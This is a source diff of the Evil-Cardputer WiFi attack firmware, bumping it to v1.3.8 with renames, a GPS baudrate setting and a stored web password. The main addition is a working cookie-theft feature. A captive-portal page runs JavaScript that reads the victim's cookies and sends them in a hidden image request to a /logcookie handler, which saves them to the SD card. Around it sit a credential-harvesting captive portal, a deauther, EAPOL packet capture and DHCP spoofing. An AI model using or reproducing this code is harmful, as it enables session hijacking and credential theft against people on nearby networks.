@@ -1,5 +1,5 @@
 /*
-   Evil-M5Core2 - WiFi Network Testing and Exploration Tool
+   Evil-Cardputer - WiFi Network Testing and Exploration Tool
 
    Copyright (c) 2024 7h30th3r0n3
 
@@ -22,8 +22,8 @@
    SOFTWARE.
 
    Disclaimer:
-   This tool, Evil-M5Core2, is developed for educational and ethical testing purposes only.
-   Any misuse or illegal use of this tool is strictly prohibited. The creator of Evil-M5Core2
+   This tool, Evil-Cardputer, is developed for educational and ethical testing purposes only.
+   Any misuse or illegal use of this tool is strictly prohibited. The creator of Evil-Cardputer
    assumes no liability and is not responsible for any misuse or damage caused by this tool.
    Users are required to comply with all applicable laws and regulations in their jurisdiction
    regarding network testing and ethical hacking.
@@ -200,7 +200,7 @@ String password = "";
 //!!!!!! CHANGE THIS !!!!!
 //!!!!!! CHANGE THIS !!!!!
 // password for web access to remote check captured credentials and send new html file !!!!!! CHANGE THIS !!!!!
-const char* accessWebPassword = "7h30th3r0n3"; // !!!!!! CHANGE THIS !!!!!
+String accessWebPassword = "7h30th3r0n3"; // !!!!!! CHANGE THIS !!!!!
 //!!!!!! CHANGE THIS !!!!!
 //!!!!!! CHANGE THIS !!!!!
 
@@ -390,7 +390,7 @@ const uint8_t sequence[messageLength] = {
 
 //Send Tesla code end
 
-
+int baudrate_gps = 9600;
 TinyGPSPlus gps;
 HardwareSerial cardgps(2); // Create a HardwareSerial object on UART2
 
@@ -666,7 +666,7 @@ void setup() {
     "Butters Awkward Escapades",
     "Navigating the Multiverse",
     "Affirmative Dave, I read you.",
-    "Your Evil-M5Core2 have died of dysentery",
+    "Your Evil-Cardputer have died of dysentery",
     "Did you disable PSRAM ?",
     "You already star project?",
     "Rick's Portal Gun Activated...",
@@ -881,12 +881,14 @@ void setup() {
       restoreConfigParameter("ssh_port");
       restoreConfigParameter("tcp_host");
       restoreConfigParameter("tcp_port");
-
+      restoreConfigParameter("baudrate_gps");
+      restoreConfigParameter("webpassword");
+      
       restoreThemeParameters();
-
+      delay(500);
       loadStartupImageConfig();
       loadStartupSoundConfig(); 
-  
+
       // Si randomOn est activé, charger une image et un son aléatoires
       if (randomOn) {
           String randomImage = getRandomImage();  // Sélectionner une image aléatoire
@@ -947,7 +949,7 @@ void setup() {
   // Textes à afficher
   const char* text1 = "Evil-Cardputer";
   const char* text2 = "By 7h30th3r0n3";
-  const char* text3 = "v1.3.7 2024";
+  const char* text3 = "v1.3.8 2024";
 
   // Mesure de la largeur du texte et calcul de la position du curseur
   int text1Width = M5.Lcd.textWidth(text1);
@@ -977,7 +979,7 @@ void setup() {
   Serial.println("-------------------");
   Serial.println("Evil-Cardputer");
   Serial.println("By 7h30th3r0n3");
-  Serial.println("v1.3.7 2024");
+  Serial.println("v1.3.8 2024");
   Serial.println("-------------------");
   // Diviser randomMessage en deux lignes pour s'adapter à l'écran
   int maxCharsPerLine = screenWidth / 10;  // Estimation de 10 pixels par caractère
@@ -1065,7 +1067,7 @@ void setup() {
   }
 
   pixels.begin(); // led init
-  cardgps.begin(9600, SERIAL_8N1, 1, -1); // Assurez-vous que les pins RX/TX sont correctement configurées pour votre matériel
+  cardgps.begin(baudrate_gps, SERIAL_8N1, 1, -1); // Assurez-vous que les pins RX/TX sont correctement configurées pour votre matériel
   pinMode(signalPin, OUTPUT);
   digitalWrite(signalPin, LOW);
   
@@ -1503,7 +1505,6 @@ void enterDebounce() {
   }
 }
 
-
 void handleMenuInput() {
   static unsigned long lastKeyPressTime = 0;
   const unsigned long keyRepeatDelay = 150; // Délai entre les répétitions d'appui
@@ -1543,6 +1544,26 @@ void handleMenuInput() {
       stateChanged = true;
     }
     keyHandled = true;
+  } else if (M5Cardputer.Keyboard.isKeyPressed('/')) {
+    if (millis() - lastKeyPressTime > keyRepeatDelay) {
+      currentIndex += 9;
+      if (currentIndex >= menuSize) {
+        currentIndex %= menuSize;  // Boucle au début du menu
+      }
+      lastKeyPressTime = millis();
+      stateChanged = true;
+    }
+    keyHandled = true;
+  } else if (M5Cardputer.Keyboard.isKeyPressed(',')) {
+    if (millis() - lastKeyPressTime > keyRepeatDelay) {
+      currentIndex -= 9;
+      if (currentIndex < 0) {
+        currentIndex = (menuSize + currentIndex) % menuSize;  // Boucle à la fin du menu
+      }
+      lastKeyPressTime = millis();
+      stateChanged = true;
+    }
+    keyHandled = true;
   } else if (M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER)) {
     executeMenuItem(currentIndex);
     stateChanged = true;
@@ -1564,6 +1585,7 @@ void handleMenuInput() {
     previousIndex = currentIndex; // Mise à jour de l'index précédent
   }
 }
+
 
 
 const uint8_t line1_hex[] = {
@@ -2200,8 +2222,120 @@ void cloneSSIDForCaptivePortal(String ssid) {
 File saveFileObject;             // File object for saving
 bool isSaveFileAuthorized = false; // Authorization flag for saving file
 
+
+
+
+// Log cookies to SD card
+void logCookiesToSD(String cookies, String domain) {
+  File file = SD.open("/cookies.log", FILE_APPEND);
+  if (file) {
+    // On log l’information de manière plus complète
+    file.println("Siphon Entry");
+    file.println("  Domain : " + domain);
+    file.println("  Cookies: " + cookies);
+    file.println("----------");
+    file.close();
+  } else {
+    Serial.println("Failed to open cookies log file!");
+  }
+}
+
+void handleCookieSiphoning() {
+  // Récupérer le paramètre 'domain' depuis la query string
+  String paramDomain = server.arg("domain");
+  if (paramDomain.isEmpty()) {
+    paramDomain = "UnknownDomain";  // Fallback si le paramètre n'est pas envoyé
+  }
+
+  // Construction du payload HTML avec corrections
+  String payload = R"rawliteral(
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="UTF-8">
+    <title>Cookie Siphoning</title>
+  </head>
+  <body>
+    <script>
+      document.addEventListener("DOMContentLoaded", function() {
+        try {
+          const cookies = document.cookie;
+          if (cookies) {
+            const img = document.createElement('img');
+            img.style.display = 'none';
+            img.src = `http://${encodeURIComponent(')rawliteral" + paramDomain + R"rawliteral(')}/logcookie?cookies=${encodeURIComponent(cookies)}&domain=${encodeURIComponent(')rawliteral" + paramDomain + R"rawliteral(')}`;
+            document.body.appendChild(img);
+          }
+        } catch (error) {
+          console.error('Error siphoning cookies:', error);
+        }
+      });
+    </script>
+  </body>
+</html>
+)rawliteral";
+
+  // Ajout des en-têtes personnalisés
+  server.sendHeader("Content-Type", "text/html; charset=UTF-8");
+  server.sendHeader("Server", "EvilTap/1.0 7h30th3r0n3/0.1");
+  server.sendHeader("Cache-Control", "public, max-age=99936000");
+  server.sendHeader("Expires", "Sat, 26 Jul 2040 05:00:00 GMT");
+  server.sendHeader("Last-Modified", "Tue, 15 Nov 1994 12:45:26 GMT");
+  server.sendHeader("Access-Control-Allow-Origin", "*");
+
+  // Envoi de la réponse avec le contenu HTML
+  server.send(200, "text/html", payload);
+}
+
+
+
+
+
+
+void handleLogRequest() {
+  // Récupérer les cookies
+  String cookies = server.arg("cookies");
+  // Récupérer le paramètre 'domain'
+  String paramDomain = server.arg("domain");
+
+  if (cookies.isEmpty()) {
+    Serial.println("Requête ignorée : cookies vides.");
+    server.send(204, "text/plain", ""); // Réponse vide
+    return;
+  }
+  if (paramDomain.isEmpty()) {
+    paramDomain = "UnknownDomain";
+  }
+
+  // Récupérer le Referer depuis les en-têtes
+  String referer = server.header("Referer");
+  if (referer.isEmpty()) {
+    referer = "UnknownReferer";
+  }
+
+  // Affichage debug sur le port série
+  Serial.println("Cookies reçus via /log :");
+  Serial.println("  Domain : " + paramDomain);
+  Serial.println("  Cookies: " + cookies);
+  Serial.println("----------------------");
+
+  // Journaliser dans le fichier
+  logCookiesToSD(cookies, paramDomain);
+
+  // Réponse 1x1 pixel
+  server.send(200, "image/gif",
+    "\x47\x49\x46\x38\x39\x61\x01\x00\x01\x00\x80\xff\x00"
+    "\x00\x00\x00\xff\xff\xff\x21\xf9\x04\x01\x00\x00\x01"
+    "\x00\x2c\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02"
+    "\x44\x01\x00\x3b");
+}
+
+
+
+
+
 void createCaptivePortal() {
-  String ssid = clonedSSID.isEmpty() ? "Evil-M5Core2" : clonedSSID;
+  String ssid = clonedSSID.isEmpty() ? "Evil-Cardputer" : clonedSSID;
   WiFi.mode(WIFI_MODE_APSTA);
   if (!isAutoKarmaActive) {
     if (captivePortalPassword == "") {
@@ -2216,6 +2350,11 @@ void createCaptivePortal() {
   
   dnsServer.start(DNS_PORT, "*", ipAP);
   isCaptivePortalOn = true;
+  
+  server.on("/siphon", handleCookieSiphoning);
+  server.on("/logcookie", handleLogRequest);
+
+  
   server.on("/", HTTP_GET, []() {
     String email = server.arg("email");
     String password = server.arg("password");
@@ -2232,14 +2371,14 @@ void createCaptivePortal() {
 
 
 
-  server.on("/evil-m5core2-menu", HTTP_GET, []() {
+  server.on("/Evil-Cardputer-menu", HTTP_GET, []() {
       String html = "<!DOCTYPE html><html><head><style>";
       html += "body{font-family:sans-serif;background:#f0f0f0;padding:40px;display:flex;justify-content:center;align-items:center;height:100vh}";
       html += "form{text-align:center;}div.menu{background:white;padding:20px;box-shadow:0 4px 8px rgba(0,0,0,0.1);border-radius:10px}";
       html += "input,a{margin:10px;padding:8px;width:80%;box-sizing:border-box;border:1px solid #ddd;border-radius:5px}";
       html += "a{display:inline-block;text-decoration:none;color:white;background:#007bff;text-align:center}";
       html += "</style></head><body>";
-      html += "<div class='menu'><form action='/evil-m5core2-menu' method='get'>";
+      html += "<div class='menu'><form action='/Evil-Cardputer-menu' method='get'>";
       html += "Password: <input type='password' name='pass'><br>";
       html += "<a href='javascript:void(0);' onclick='this.href=\"/credentials?pass=\"+document.getElementsByName(\"pass\")[0].value'>Credentials</a>";
       html += "<a href='javascript:void(0);' onclick='this.href=\"/uploadhtmlfile?pass=\"+document.getElementsByName(\"pass\")[0].value'>Upload File On SD</a>";
@@ -2252,7 +2391,7 @@ void createCaptivePortal() {
       
       server.send(200, "text/html", html);
       Serial.println("-------------------");
-      Serial.println("evil-m5core2-menu access.");
+      Serial.println("Evil-Cardputer-menu access.");
       Serial.println("-------------------");
   });
 
@@ -2492,7 +2631,7 @@ void createCaptivePortal() {
       html += "</style></head><body>";
       
       // Ajout du bouton de retour au menu principal
-      html += "<p><a href='/evil-m5core2-menu'><button>Menu</button></a></p>";
+      html += "<p><a href='/Evil-Cardputer-menu'><button>Menu</button></a></p>";
       
       html += "<ul>";
       
@@ -2806,7 +2945,7 @@ void handleSdCardBrowse() {
     }
 
     // Ajout du bouton pour revenir au menu principal
-    String html = "<p><a href='/evil-m5core2-menu'><button style='background-color: #007bff; border: none; color: white; padding: 6px 15px; text-align: center; text-decoration: none; display: inline-block; font-size: 16px; margin: 4px 2px; cursor: pointer;'>Menu</button></a></p>";
+    String html = "<p><a href='/Evil-Cardputer-menu'><button style='background-color: #007bff; border: none; color: white; padding: 6px 15px; text-align: center; text-decoration: none; display: inline-block; font-size: 16px; margin: 4px 2px; cursor: pointer;'>Menu</button></a></p>";
     
     // Générer le HTML pour lister les fichiers et dossiers
     html += getDirectoryHtml(dir, dirPath, password);
@@ -3886,21 +4025,23 @@ void loopOptions(std::vector<std::pair<String, std::function<void()>>> &options,
     }
 }
 
-void showSettingsMenu() { 
-    std::vector<std::pair<String, std::function<void()>>> options; 
+void showSettingsMenu() {
+    std::vector<std::pair<String, std::function<void()>>> options;
 
     bool continueSettingsMenu = true;
 
     while (continueSettingsMenu) {
         options.clear();  // Vider les options à chaque itération pour les mettre à jour dynamiquement
 
-        options.push_back({"Brightness", brightness}); 
+        options.push_back({"Brightness", brightness});
         options.push_back({soundOn ? "Sound Off" : "Sound On", []() {toggleSound();}});
         options.push_back({ledOn ? "LED Off" : "LED On", []() {toggleLED();}});
-        options.push_back({"Set Startup Image", setStartupImage}); 
+        options.push_back({"Set GPS Baudrate", []() {setGPSBaudrate();}}); // Nouvelle option pour le baudrate GPS
+        options.push_back({"Set Startup Image", setStartupImage});
         options.push_back({"Set Startup Volume", adjustVolume});
         options.push_back({"Set Startup Sound", setStartupSound});
         options.push_back({randomOn ? "Random startup Off" : "Random startup On", []() {toggleRandom();}});
+
         loopOptions(options, false, true, "Settings");
 
         // Vérifie si BACKSPACE a été pressé pour quitter le menu
@@ -3910,6 +4051,106 @@ void showSettingsMenu() {
     }
     inMenu = true;
 }
+
+void setGPSBaudrate() {
+    // Liste des baudrates disponibles
+    std::vector<int> baudrates = {9600, 19200, 115200};
+    int currentBaudrateIndex = 0;
+    bool baudrateSelected = false;
+
+    const int maxDisplayItems = 3; // Tous les items peuvent être affichés simultanément
+    bool needDisplayUpdate = true;
+
+    enterDebounce();
+    while (!baudrateSelected) {
+        if (needDisplayUpdate) {
+            M5.Display.clear();
+            M5.Display.setCursor(0, 0);
+            M5.Display.setTextColor(menuTextFocusedColor, menuBackgroundColor);
+            M5.Display.println("Select GPS Baudrate:");
+
+            for (int i = 0; i < baudrates.size(); i++) {
+                if (i == currentBaudrateIndex) {
+                    M5.Display.setTextColor(menuTextFocusedColor); // Highlight selected item
+                } else {
+                    M5.Display.setTextColor(menuTextUnFocusedColor, TFT_BLACK); // Normal text color
+                }
+                M5.Display.println(String(baudrates[i]));
+            }
+
+            needDisplayUpdate = false; // Reset the display update flag
+        }
+
+        M5.update();
+        M5Cardputer.update();
+
+        // Navigation vers le haut
+        if (M5Cardputer.Keyboard.isKeyPressed(';')) {
+            currentBaudrateIndex = (currentBaudrateIndex - 1 + baudrates.size()) % baudrates.size();
+            needDisplayUpdate = true;
+        } 
+        // Navigation vers le bas
+        else if (M5Cardputer.Keyboard.isKeyPressed('.')) {
+            currentBaudrateIndex = (currentBaudrateIndex + 1) % baudrates.size();
+            needDisplayUpdate = true;
+        } 
+        // Sélectionner le baudrate
+        else if (M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER)) {
+            baudrate_gps = baudrates[currentBaudrateIndex];
+            saveGPSBaudrateConfig(baudrate_gps);
+            M5.Display.setTextColor(menuTextFocusedColor, menuBackgroundColor);
+            M5.Display.fillScreen(menuBackgroundColor);
+            M5.Display.setCursor(0, M5.Display.height() / 2);
+            M5.Display.print("GPS Baudrate set to\n" + String(baudrate_gps));
+            cardgps.end();
+            cardgps.begin(baudrate_gps, SERIAL_8N1, 1, -1);
+            delay(1000);
+            baudrateSelected = true;
+        } 
+        // Quitter sans sélectionner
+        else if (M5Cardputer.Keyboard.isKeyPressed(KEY_BACKSPACE)) {
+            baudrateSelected = true;
+        }
+
+        delay(150);  // Anti-bounce delay for key presses
+    }
+}
+
+void saveGPSBaudrateConfig(int baudrate) {
+    // Lire le contenu du fichier de configuration
+    File file = SD.open(configFilePath, FILE_READ);
+    String content = "";
+    bool found = false;
+
+    if (file) {
+        while (file.available()) {
+            String line = file.readStringUntil('\n');
+            if (line.startsWith("baudrate_gps=")) {
+                // Remplacer la ligne existante par la nouvelle valeur
+                content += "baudrate_gps=" + String(baudrate) + "\n";
+                found = true;
+            } else {
+                // Conserver les autres lignes
+                content += line + "\n";
+            }
+        }
+        file.close();
+    }
+
+    // Si la clé n'a pas été trouvée, l'ajouter à la fin
+    if (!found) {
+        content += "baudrate_gps=" + String(baudrate) + "\n";
+    }
+
+    // Réécrire tout le fichier de configuration
+    file = SD.open(configFilePath, FILE_WRITE);
+    if (file) {
+        file.print(content);
+        file.close();
+    }
+}
+
+
 
 void saveStartupSoundConfig(const String& paramValue) {
     // Lire le contenu du fichier de configuration
@@ -4499,13 +4740,13 @@ void restoreConfigParameter(String key) {
             selectedTheme = stringValue;
             Serial.println("Selected Theme restored to " + stringValue);
           } else if (key == "wifi_ssid" && ssid.length() == 0) {
-              stringValue.toCharArray(ssid_buffer, sizeof(ssid_buffer));
-              ssid = ssid_buffer;
-              Serial.println("WiFi SSID restored to " + stringValue);
+            stringValue.toCharArray(ssid_buffer, sizeof(ssid_buffer));
+            ssid = ssid_buffer;
+            Serial.println("WiFi SSID restored to " + stringValue);
           } else if (key == "wifi_password" && password.length() == 0) {
-              stringValue.toCharArray(password_buffer, sizeof(password_buffer));
-              password = password_buffer;
-              Serial.println("WiFi Password restored ");
+            stringValue.toCharArray(password_buffer, sizeof(password_buffer));
+            password = password_buffer;
+            Serial.println("WiFi Password restored");
           } else if (key == "ssh_user" && ssh_user.length() == 0) {
             ssh_user = stringValue;
             Serial.println("SSH User restored to " + stringValue);
@@ -4526,6 +4767,13 @@ void restoreConfigParameter(String key) {
             intValue = stringValue.toInt();
             tcp_port = intValue;
             Serial.println("TCP Port restored to " + String(intValue));
+          } else if (key == "baudrate_gps") {
+            intValue = stringValue.toInt();
+            baudrate_gps = intValue;
+            Serial.println("GPS Baudrate restored to " + String(intValue));
+          } else if (key == "webpassword") {
+            accessWebPassword = stringValue;
+            Serial.println("Web password restored");
           }
           keyFound = true;
           break;
@@ -4545,6 +4793,10 @@ void restoreConfigParameter(String key) {
           boolValue = false;  // Default to sound off
         } else if (key == "randomOn") {
           boolValue = false;  // Default to random startup disabled
+        } else if (key == "baudrate_gps") {
+          baudrate_gps = 9600; // Default baudrate for GPS
+        } else if (key == "webpassword") {
+          accessWebPassword = "7h30th3r0n3"; // Default web password
         }
       }
 
@@ -4572,9 +4824,14 @@ void restoreConfigParameter(String key) {
       soundOn = false;  // Default to sound off
     } else if (key == "randomOn") {
       randomOn = false;  // Default to random startup disabled
+    } else if (key == "baudrate_gps") {
+      baudrate_gps = 9600; // Default baudrate for GPS
+    } else if (key == "webpassword") {
+      accessWebPassword = "7h30th3r0n3"; // Default web password
     }
   }
 }
+
 
 
 
@@ -5969,9 +6226,9 @@ void displayAPStatus(const char* ssid, unsigned long startTime, int autoKarmaAPD
 
 String createPreHeader() {
   String preHeader = "WigleWifi-1.4";
-  preHeader += ",appRelease=v1.3.7"; // Remplacez [version] par la version de votre application
+  preHeader += ",appRelease=v1.3.8"; // Remplacez [version] par la version de votre application
   preHeader += ",model=Cardputer";
-  preHeader += ",release=v1.3.7"; // Remplacez [release] par la version de l'OS de l'appareil
+  preHeader += ",release=v1.3.8"; // Remplacez [release] par la version de l'OS de l'appareil
   preHeader += ",device=Evil-Cardputer"; // Remplacez [device name] par un nom de périphérique, si souhaité
   preHeader += ",display=7h30th3r0n3"; // Ajoutez les caractéristiques d'affichage, si pertinent
   preHeader += ",board=M5Cardputer";
@@ -6368,7 +6625,7 @@ uint8_t beaconPacket[109] = {
     0x00, 0x00
 };
 
-const uint8_t channels[] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11}; // Canaux Wi-Fi utilisés (1-11)
+const uint8_t channels[] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13}; // Canaux Wi-Fi utilisés (1-11)
 uint8_t channelIndex = 0;
 uint8_t wifi_channel = 1;
 
@@ -7187,7 +7444,7 @@ void enregistrerDansFichierPCAP(const wifi_promiscuous_pkt_t* packet, bool beaco
 
 
 // deauther start
-// Big thanks to Aro2142 (https://github.com/7h30th3r0n3/Evil-M5Core2/issues/16)
+// Big thanks to Aro2142 (https://github.com/7h30th3r0n3/Evil-Cardputer/issues/16)
 // Even Bigger thanks to spacehuhn https://github.com/spacehuhn / https://spacehuhn.com/
 // Big thanks to the Nemo project for the easy bypass: https://github.com/n0xa/m5stick-nemo
 // Reference to understand : https://github.com/risinek/esp32-wifi-penetration-tool/tree/master/components/wsl_bypasser
@@ -10405,7 +10662,7 @@ int totalNetworks = 0;
 unsigned long lastLog = 0;
 int currentScreen = 1;  // Track which screen is currently displayed
 
-const String wigleHeaderFileFormat = "WigleWifi-1.4,appRelease=v1.3.7,model=Cardputer,release=v1.3.7,device=Evil-Cardputer,display=7h30th3r0n3,board=M5Cardputer,brand=M5Stack";
+const String wigleHeaderFileFormat = "WigleWifi-1.4,appRelease=v1.3.8,model=Cardputer,release=v1.3.8,device=Evil-Cardputer,display=7h30th3r0n3,board=M5Cardputer,brand=M5Stack";
 
 char* log_col_names[LOG_COLUMN_COUNT] = {
     "MAC", "SSID", "AuthMode", "FirstSeen", "Channel", "RSSI", "CurrentLatitude", "CurrentLongitude", "AltitudeMeters", "AccuracyMeters", "Type"
@@ -11138,7 +11395,6 @@ void writePCAPHeader_snifferAll(File &file) {
   file.flush();
   Serial.println("PCAP header written.");
 }
-
 void recordPacketToPCAPFile_snifferAll(const wifi_promiscuous_pkt_t* packet) {
   if (!sniffFile || isPaused) {
     Serial.println("Capture file not open or sniffing is paused, packet not recorded.");
@@ -11148,8 +11404,11 @@ void recordPacketToPCAPFile_snifferAll(const wifi_promiscuous_pkt_t* packet) {
 
   const uint8_t *frame = packet->payload;
   uint16_t frameControl = (frame[1] << 8) | frame[0];
+  uint8_t frameType = (frameControl >> 2) & 0x03; // Extraction des bits 2-3 pour le type
   uint8_t frameSubType = (frameControl & 0xF0) >> 4;
-  if (frameSubType == 0x08 || frameSubType == 0x04 || frameSubType == 0x05 || frameSubType == 0x0D || frameSubType == 0x0B || frameSubType == 0x0C) {
+
+  if (frameSubType == 0x08 || frameSubType == 0x04 || frameSubType == 0x05 || 
+      frameSubType == 0x0D || frameSubType == 0x0B || frameSubType == 0x0C) {
     sig_len -= 4;
   }
 
@@ -11164,36 +11423,40 @@ void recordPacketToPCAPFile_snifferAll(const wifi_promiscuous_pkt_t* packet) {
   sniffFile.write(packet->payload, sig_len);
   sniffFile.flush();  
 
+  // Vérification si c'est une trame EAPOL
   if (estUnPaquetEAPOL(packet)) {
     eapolCount++;
     Serial.printf("EAPOL packet recorded. Number of EAPOL: %d\n", eapolCount);
-  } else {
+  } else if (frameType == 0) { // Vérification si c'est une trame de Management
     switch (frameSubType) {
-      case 0x08:
+      case 0x08: // Beacon
         beaconCount++;
         Serial.printf("Beacon packet recorded. Number of Beacons: %d\n", beaconCount);
         break;
-      case 0x04:
+      case 0x04: // Probe Request
         probeReqCount++;
         Serial.printf("Probe Request packet recorded. Number of Probe Requests: %d\n", probeReqCount);
         break;
-      case 0x05:
+      case 0x05: // Probe Response
         probeRespCount++;
         Serial.printf("Probe Response packet recorded. Number of Probe Responses: %d\n", probeRespCount);
         break;
-      case 0x0C:
+      case 0x0C: // Deauthentication
         deauthCountSniff++;
         Serial.printf("Deauthentication packet recorded. Number of Deauthentications: %d\n", deauthCountSniff);
         break;
       default:
-        Serial.println("Unrecognized packet type recorded.");
+        Serial.println("Unrecognized Management packet type recorded.");
         break;
     }
+  } else {
+    Serial.println("Non-EAPOL, non-Management packet recorded.");
   }
 
   packetSavedCount++; 
   Serial.printf("Packet recorded. Total number of packets saved: %d\n", packetSavedCount);
 }
+
 
 void allTrafficCallback_snifferAll(void* buf, wifi_promiscuous_pkt_type_t type) {
   wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
@@ -13133,53 +13396,7 @@ void generateRandomMAC(uint8_t *mac, uint16_t iteration) {
     mac[5] = random(0x00, 0xFF);
 }
 
-char transactionHostname[64];
-
-// List of machine names
-const char *hostnames[] = {
-    "Evil-M5Project",
-    "EvilStarvation",
-    "Hackintosh",
-    "RouterMcRouteFace",
-    "NotAVirus",
-    "Cyberdyne101",
-    "R2Hack2",
-    "MatrixMode",
-    "QuantumRick",
-    "MordorLAN",
-    "SkynetNode",
-    "DeathStarHub",
-    "Voldemodem",
-    "SithRouter",
-    "TheGibson",
-    "TowelieAP",
-    "PickleLAN",
-    "PortalGun",
-    "NSA_Truck",
-    "OneDoesNotSimply",
-    "NeuralNet",
-    "WarGames",
-    "EvilMorty",
-    "FrodoLAN",
-    "HAL9000",
-    "Plumbus",
-    "BatSignlan",
-    "EvilIsNear",
-    "EvilComputer",
-    "EvilServer",
-    "EvilPrinter",
-    "EvilRouter",
-    "EvilHub",
-    "EvilNAS",
-    "EvilTV",
-    "EvilTVBOX",
-    "EvilPhone",
-};
-
-const char* getRandomHostname() {
-    uint8_t index = random(0, sizeof(hostnames) / sizeof(hostnames[0]));
-    return hostnames[index];
-}
+const char* fixedHostname = "Evil-Client";
 
 void sendDHCPDiscover(uint8_t *mac) {
     uint8_t dhcpDiscover[300] = {0};
@@ -13239,15 +13456,12 @@ void sendDHCPDiscover(uint8_t *mac) {
     dhcpDiscover[index++] = 1;  // DHCP Discover
 
     // Host Name Option (12)
-    const char* hostname = getRandomHostname();
-    strncpy(transactionHostname, hostname, sizeof(transactionHostname) - 1); // Store hostname for transaction
-    transactionHostname[sizeof(transactionHostname) - 1] = '\0'; // Ensure null termination
-
     dhcpDiscover[index++] = 12;               // Option 12: Host Name
-    dhcpDiscover[index++] = strlen(transactionHostname); // Length of the host name
-    for (size_t i = 0; i < strlen(transactionHostname); i++) {
-        dhcpDiscover[index++] = transactionHostname[i];  // Add the host name characters
+    dhcpDiscover[index++] = strlen(fixedHostname); // Length of the host name
+    for (size_t i = 0; i < strlen(fixedHostname); i++) {
+        dhcpDiscover[index++] = fixedHostname[i];  // Add the host name characters
     }
+
 
     dhcpDiscover[index++] = 55; // Parameter Request List
     dhcpDiscover[index++] = 4;  // Length
@@ -13263,7 +13477,6 @@ void sendDHCPDiscover(uint8_t *mac) {
         udp.endPacket();
         discoverCount++;
         Serial.println("Sent DHCP Discover with Host Name...");
-        Serial.printf("Host Name: %s\n", transactionHostname);
     } else {
         Serial.println("Failed to send DHCP Discover.");
         M5.Display.setCursor(0, M5.Display.height() - 40);
@@ -13347,11 +13560,11 @@ void sendDHCPRequest(uint8_t *mac, IPAddress offeredIP, IPAddress dhcpServerIP) 
 
     // Host Name Option (12)
     dhcpRequest[index++] = 12;               // Option 12: Host Name
-    dhcpRequest[index++] = strlen(transactionHostname); // Length of the host name
-    for (size_t i = 0; i < strlen(transactionHostname); i++) {
-        dhcpRequest[index++] = transactionHostname[i];  // Add the host name characters
+    dhcpRequest[index++] = strlen(fixedHostname); // Length of the host name
+    for (size_t i = 0; i < strlen(fixedHostname); i++) {
+        dhcpRequest[index++] = fixedHostname[i];  // Add the host name characters
     }
-
+    
     dhcpRequest[index++] = 255; // End Option
 
     // Send the packet
@@ -13360,7 +13573,6 @@ void sendDHCPRequest(uint8_t *mac, IPAddress offeredIP, IPAddress dhcpServerIP) 
         udp.endPacket();
         requestCount++;
         Serial.println("Sent DHCP Request with Host Name...");
-        Serial.printf("Host Name: %s\n", transactionHostname);
     } else {
         Serial.println("Failed to send DHCP Request.");
         M5.Display.setCursor(0, M5.Display.height() - 40);
@@ -13855,161 +14067,429 @@ void printFile() {
 #define SNMP_PORT 161
 #define SNMP_COMMUNITY "public"
 
+// Function to encode an OID into BER format
+int encodeOID(const char* oidStr, uint8_t* outBuffer, size_t outSize) {
+    std::vector<int> parts;
+    char temp[64];
+    strncpy(temp, oidStr, sizeof(temp) - 1);
+    temp[sizeof(temp) - 1] = '\0';
+
+    char* token = strtok(temp, ".");
+    while (token) {
+        parts.push_back(atoi(token));
+        token = strtok(nullptr, ".");
+    }
+
+    if (parts.size() < 2) return -1; // Invalid OID
+
+    int pos = 0;
+    outBuffer[pos++] = (uint8_t)(parts[0] * 40 + parts[1]);
+
+    for (size_t i = 2; i < parts.size(); i++) {
+        int val = parts[i];
+        if (val < 128) {
+            outBuffer[pos++] = (uint8_t)val;
+        } else {
+            return -1; // Simplified: no multi-byte support
+        }
+        if (pos >= (int)outSize) return -1;
+    }
+    return pos;
+}
+
+
+bool parseSNMPResponse(const uint8_t* buffer, size_t bufferLen, String &outValue) {
+    // Keep an index that moves through buffer
+    size_t index = 0;
+
+    // 1) Expect top-level SEQUENCE (0x30)
+    if (buffer[index++] != 0x30) {
+        Serial.println("[ERROR] Not a SEQUENCE at top-level.");
+        return false;
+    }
+    // Read length
+    uint8_t snmpMsgLength = buffer[index++];
+    
+    // 2) Read version INTEGER
+    if (buffer[index++] != 0x02) {
+        Serial.println("[ERROR] Expected version INTEGER tag.");
+        return false;
+    }
+    uint8_t versionLength = buffer[index++];
+    // Skip the version bytes
+    index += versionLength;
+
+    // 3) Read community OCTET STRING
+    if (buffer[index++] != 0x04) {
+        Serial.println("[ERROR] Expected community OCTET STRING tag.");
+        return false;
+    }
+    uint8_t communityLength = buffer[index++];
+    // Skip the community bytes
+    index += communityLength;
+
+    // 4) Read PDU type (0xA2 for Get-Response)
+    uint8_t pduType = buffer[index++];
+    if (pduType != 0xA2) {
+        Serial.printf("[WARN] Unexpected PDU type: 0x%02X\n", pduType);
+    }
+    uint8_t pduLength = buffer[index++];
+
+    // 5) Read request-id INTEGER
+    if (buffer[index++] != 0x02) {
+        Serial.println("[ERROR] Expected request-id INTEGER tag.");
+        return false;
+    }
+    uint8_t ridLength = buffer[index++];
+    index += ridLength; // skip request id bytes
+
+    // 6) Read error-status INTEGER
+    if (buffer[index++] != 0x02) {
+        Serial.println("[ERROR] Expected error-status INTEGER tag.");
+        return false;
+    }
+    uint8_t errStatusLen = buffer[index++];
+    index += errStatusLen; // skip error status
+
+    // 7) Read error-index INTEGER
+    if (buffer[index++] != 0x02) {
+        Serial.println("[ERROR] Expected error-index INTEGER tag.");
+        return false;
+    }
+    uint8_t errIndexLen = buffer[index++];
+    index += errIndexLen; // skip error index
+
+    // 8) Read variable-bindings SEQUENCE
+    if (buffer[index++] != 0x30) {
+        Serial.println("[ERROR] Expected VarBind list SEQUENCE (0x30).");
+        return false;
+    }
+    uint8_t vbListLength = buffer[index++];
+
+    // 9) Read first VarBind SEQUENCE
+    if (buffer[index++] != 0x30) {
+        Serial.println("[ERROR] Expected single VarBind SEQUENCE (0x30).");
+        return false;
+    }
+    uint8_t vbLength = buffer[index++];
+
+    // 10) Read the OID
+    if (buffer[index++] != 0x06) {
+        Serial.println("[ERROR] Expected OID tag (0x06).");
+        return false;
+    }
+    uint8_t oidLength = buffer[index++];
+    // skip the OID bytes
+    index += oidLength;
+
+    // 11) Now read the Value portion
+    uint8_t valueTag = buffer[index++];
+    uint8_t valueLen = buffer[index++];
+
